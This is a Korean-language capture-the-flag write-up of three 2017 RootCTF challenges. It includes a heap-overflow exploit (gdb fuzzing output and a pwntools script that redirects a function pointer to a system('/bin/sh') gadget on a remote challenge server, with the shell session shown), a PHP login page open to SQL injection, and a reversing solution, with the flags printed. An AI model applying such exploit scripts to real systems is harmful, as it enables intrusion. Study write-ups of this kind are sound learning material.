# [2017_ROOTCTF] \[PWN] Point To Pointer

## Key words

* Heap based Buffer Overflow

## Solution

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax@4
  __int64 v4; // rcx@4
  char v5; // [sp+Fh] [bp-11h]@1
  void *buf; // [sp+10h] [bp-10h]@1
  __int64 v7; // [sp+18h] [bp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  buf = malloc(0x30uLL);
  *((_QWORD *)buf + 2) = sub_400796;
  (*((void (__fastcall **)(_QWORD, _QWORD))buf + 2))(48LL, 0LL);
  read(0, buf, 0x64uLL);
  puts("Retry?(Y/N)");
  __isoc99_scanf("%c", &v5);
  if ( v5 == 89 )
    (*((void (**)(void))buf + 2))();
  else
    puts("Good bye");
  result = 0LL;
  v4 = *MK_FP(__FS__, 40LL) ^ v7;
  return result;
}
```

malloc을 0x30만큼 한 후, read할 때 0x64만큼 합니다. 오버플로우가 발생할 것으로 예상됩니다.

랜덤 패턴으로 퍼징을 해보았습니다.

```
gdb-peda$ pattern_create 0x63
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA'
gdb-peda$ r
Starting program: /root/labs/ctf/2017_rootctf/pointer 
welcome to RootCTF!
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA
Retry?(Y/N)
Y

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b04230 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x41412d4141434141 ('AACAA-AA')
RSI: 0x1 
RDI: 0x7fffffffddc0 --> 0x0 
RBP: 0x7fffffffe300 --> 0x4008c0 (push   r15)
RSP: 0x7fffffffe2e0 --> 0x4008c0 (push   r15)
RIP: 0x40088e (call   rdx)
R8 : 0x0 
R9 : 0x7ffff7fe3700 (0x00007ffff7fe3700)
R10: 0x400972 --> 0x20646f6f47006325 ('%c')
R11: 0x246 
R12: 0x4006a0 (xor    ebp,ebp)
R13: 0x7fffffffe3e0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400881:	mov    rax,QWORD PTR [rbp-0x10]
   0x400885:	mov    rdx,QWORD PTR [rax+0x10]
   0x400889:	mov    eax,0x0
=> 0x40088e:	call   rdx
   0x400890:	jmp    0x40089c
   0x400892:	mov    edi,0x400975
   0x400897:	call   0x400610 <puts@plt>
   0x40089c:	mov    eax,0x0
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe2e0 --> 0x4008c0 (push   r15)
0008| 0x7fffffffe2e8 --> 0x59000000004006a0 
0016| 0x7fffffffe2f0 --> 0x602010 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA\n")
0024| 0x7fffffffe2f8 --> 0x6557323f29e96f00 
0032| 0x7fffffffe300 --> 0x4008c0 (push   r15)
0040| 0x7fffffffe308 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe310 --> 0x0 
0056| 0x7fffffffe318 --> 0x7fffffffe3e8 --> 0x7fffffffe633 ("/root/labs/ctf/2017_rootctf/pointer")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040088e in ?? ()
gdb-peda$ 
gdb-peda$ pattern_search
Registers contain pattern buffer:
RDX+0 found at offset: 16
No register points to pattern buffer
Pattern buffer found at:
0x00602010 : offset    0 - size   99 ([heap])
References to pattern buffer found at:
0x00007fffffffe2f0 : 0x00602010 ($sp + 0x10 [4 dwords])
```

16만큼의 오프셋 후에 조작할 주소를 적어주면 되는데 다음과 같이 매직 함수가 존재합니다.

```
.text:00000000004007A7                 push    rbp
.text:00000000004007A8                 mov     rbp, rsp
.text:00000000004007AB                 mov     edi, offset aGood ; "Good~"
.text:00000000004007B0                 call    _puts
.text:00000000004007B5                 mov     edi, offset aBinSh ; "/bin/sh"
.text:00000000004007BA                 call    _system
.text:00000000004007BF                 nop
.text:00000000004007C0                 pop     rbp
.text:00000000004007C1                 retn
```

rip를 0x4007a7로 바꾸면 됩니다.

## Exploit

```python
from pwn import  *
import sys

if len(sys.argv) == 1:
	p = process("./pointer")
else:
	p = remote("222.110.147.52",42632)


print p.recv()
payload = "a"*16
payload += p64(0x4007a7)
p.sendline(payload)
print p.recv()
p.sendline("Y")
p.interactive()
```

## 실행 결과

```
[+] Opening connection to 222.110.147.52 on port 42632: Done
welcome to RootCTF!


[*] Switching to interactive mode
Retry?(Y/N)
Good~
$ ls
flag
pointer
run.sh
$ cat flag
FLAG is FLAG{P0InT_2_pOiNt_2_PO1t3R!}
```



# [2017_ROOTCTF] \[WEB] Login

## Key words

- base64 decode

## Solution

```php
<?php 
include("dbcon.php"); 
$pw=$_GET['pw']; 
$fpw=$_GET['pw'][1]; 
if(strlen($fpw)>5){ 
    echo "<script>alert('no hack~');location.href='login.html'</script>"; 
} 
$query="select * from Login where pw='$fpw'"; 
$info=mysqli_query($con,$query); 
$result=mysqli_fetch_array($info); 
if($result['id']){ 
    setcookie("flag","VmxjeE1FNUdSbk5UV0hCclUwVmFiMWxzVm1GTlZtUnhVbFJXYVZKdGVGcFdSM0JYWWxaV1ZVMUVhejA9"); 
    echo "<script>location.href='flag.html'</script>"; 
} 
highlight_file("login.php"); 
?>
```

수차례 base64디코드를 하면 됩니다

`FLAG{jjang_easy}`



# [2017_ROOTCTF] \[REV] Stage

## Solution

```c
int sub_45EE60()
{
  int v0; // edx@1
  int v1; // ST04_4@3
  int v2; // ecx@3
  char v4; // [sp+Ch] [bp-D8h]@1
  DWORD dwMilliseconds; // [sp+D0h] [bp-14h]@1
  int v6; // [sp+DCh] [bp-8h]@1
  int savedregs; // [sp+E4h] [bp+0h]@3

  memset(&v4, 0xCCu, 0xD8u);
  v6 = 0;
  dwMilliseconds = 1000;
  sub_4581E4("color b");
  sub_45A084("------------------------------");
  sub_45A084(" Hello! Welcome to My Stage.");
  sub_45A084("     Stage Level 1 ~ 10 ");
  sub_45A084("        Can you wait?   ");
  sub_45A084("       Yes : 1 No : 0   ");
  sub_45A084("------------------------------");
  sub_45A83B("> ");
  sub_459724("%d", &v6);
  if ( v6 == 1 )
  {
    dwMilliseconds = sub_458086(dwMilliseconds);
    dwMilliseconds = sub_45808B(dwMilliseconds);
    dwMilliseconds = sub_458090(dwMilliseconds);
    dwMilliseconds = sub_458095(dwMilliseconds);
    dwMilliseconds = sub_45809A(dwMilliseconds);
    dwMilliseconds = sub_4580A9(dwMilliseconds);
    dwMilliseconds = sub_4580AE(dwMilliseconds);
    dwMilliseconds = sub_4580B8(dwMilliseconds);
    dwMilliseconds = sub_4580BD(dwMilliseconds);
    sub_459C60(dwMilliseconds);
  }
  v1 = v0;
  sub_459B48(&savedregs, &dword_45EFD0);
  return sub_45883D(v2, v1);
}
```

이 부분이 메인이다. dwMilliseconds 변수를 0으로 패치하면 플래그가 바로 뜰줄 알았는데 출력이 안됐다. 그래서 함수를 하나씩 뒤적이다 보니 아래의 함수를 확인할 수 있었다.

```c
int __cdecl sub_468E80(signed int a1)
{
  int v1; // ebx@3
  int v2; // edx@4
  int v3; // ecx@4
  char v5; // [sp+Ch] [bp-164h]@1
  int v6; // [sp+D0h] [bp-A0h]@3
  int i; // [sp+DCh] [bp-94h]@1
  int v8; // [sp+E8h] [bp-88h]@1
  int v9; // [sp+F4h] [bp-7Ch]@1
  void *v10; // [sp+F8h] [bp-78h]@1
  int *v11; // [sp+FCh] [bp-74h]@1
  char *v12; // [sp+100h] [bp-70h]@1
  int v13; // [sp+104h] [bp-6Ch]@1
  int v14; // [sp+108h] [bp-68h]@1
  int v15; // [sp+10Ch] [bp-64h]@1
  int v16; // [sp+110h] [bp-60h]@1
  int v17; // [sp+114h] [bp-5Ch]@1
  int v18; // [sp+118h] [bp-58h]@1
  int v19; // [sp+11Ch] [bp-54h]@1
  int v20; // [sp+120h] [bp-50h]@1
  int v21; // [sp+124h] [bp-4Ch]@1
  int v22; // [sp+128h] [bp-48h]@1
  int v23; // [sp+12Ch] [bp-44h]@1
  int v24; // [sp+130h] [bp-40h]@1
  int v25; // [sp+134h] [bp-3Ch]@1
  int v26; // [sp+138h] [bp-38h]@1
  int v27; // [sp+13Ch] [bp-34h]@1
  int v28; // [sp+140h] [bp-30h]@1
  int v29; // [sp+144h] [bp-2Ch]@1
  int v30; // [sp+148h] [bp-28h]@1
  int v31; // [sp+14Ch] [bp-24h]@1
  int v32; // [sp+150h] [bp-20h]@1
  int v33; // [sp+154h] [bp-1Ch]@1
  int v34; // [sp+158h] [bp-18h]@1
  int v35; // [sp+15Ch] [bp-14h]@1
  int v36; // [sp+160h] [bp-10h]@1
  int v37; // [sp+164h] [bp-Ch]@1
  unsigned int v38; // [sp+16Ch] [bp-4h]@1
  int savedregs; // [sp+170h] [bp+0h]@1

  memset(&v5, 0xCCu, 0x164u);
  v38 = (unsigned int)&savedregs ^ __security_cookie;
  v9 = 'F\0\0';
  v10 = &loc_4C0000;
  v11 = dword_410000;
  v12 = &byte_46FFB4[76];
  v13 = '{\0\0';
  v14 = 'Y\0\0';
  v15 = '0\0\0';
  v16 = 'u\0\0';
  v17 = 'r\0\0';
  v18 = '_\0\0';
  v19 = 'p\0\0';
  v20 = '4\0\0';
  v21 = 't\0\0';
  v22 = '1\0\0';
  v23 = 'e\0\0';
  v24 = 'n\0\0';
  v25 = 'c\0\0';
  v26 = '3\0\0';
  v27 = '_\0\0';
  v28 = '1\0\0';
  v29 = 's\0\0';
  v30 = '_\0\0';
  v31 = 'g\0\0';
  v32 = 'r\0\0';
  v33 = '3\0\0';
  v34 = 'a\0\0';
  v35 = 't\0\0';
  v36 = '!\0\0';
  v37 = '}\0\0';
  v8 = a1 / 10000000 + 6;
  for ( i = 0; i < 29; ++i )
  {
    v6 = *(&v9 + i);
    v1 = __ROL4__(v6, v8);
    v6 = v1;
    sub_45A83B("%c");
  }
  sub_45A83B("\n");
  sub_459B48(&savedregs, &dword_469024);
  sub_459C6A((unsigned int)&savedregs ^ v38);
  return sub_45883D(v3, v2);
}
```

플래그로 추정되는 문자를 하나씩 이어 붙이면 `{Y0ur_p4t1enc3_1s_gr3at!}`라는 플래그가 완성된다.



